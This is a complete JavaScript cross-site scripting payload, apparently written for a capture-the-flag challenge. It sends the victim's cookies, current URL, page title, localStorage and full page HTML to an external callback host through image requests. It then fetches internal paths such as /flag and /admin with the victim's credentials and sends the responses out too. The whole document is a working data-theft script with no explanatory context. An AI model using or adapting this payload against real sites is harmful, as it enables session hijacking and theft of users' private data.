(function(){
  var o="dagugkm408jngg9v1gp0dnw61i1hwdfrr.oast.live";
  function ex(p,v){try{new Image().src="https://"+o+"/"+p+"?d="+encodeURIComponent(String(v).slice(0,1500));}catch(e){}}
  ex("cookie",document.cookie);
  ex("url",location.href);
  ex("title",document.title);
  ex("ls",(function(){try{return JSON.stringify(localStorage)}catch(e){return "err"}})());
  ex("dom",document.documentElement.innerHTML);
  // 試取內網常見 flag 路徑
  ["/flag","/flag.txt","/admin","/api/flag","/internal","/robots.txt","/static/flag.txt","/challenge/flag"].forEach(function(p){
    fetch(p,{credentials:"include"}).then(function(r){return r.text().then(function(t){ex("fetch"+p.replace(/[^a-z]/g,""),r.status+" "+t.slice(0,1200))})}).catch(function(e){ex("fetcherr"+p.replace(/[^a-z]/g,""),String(e))});
  });
})();
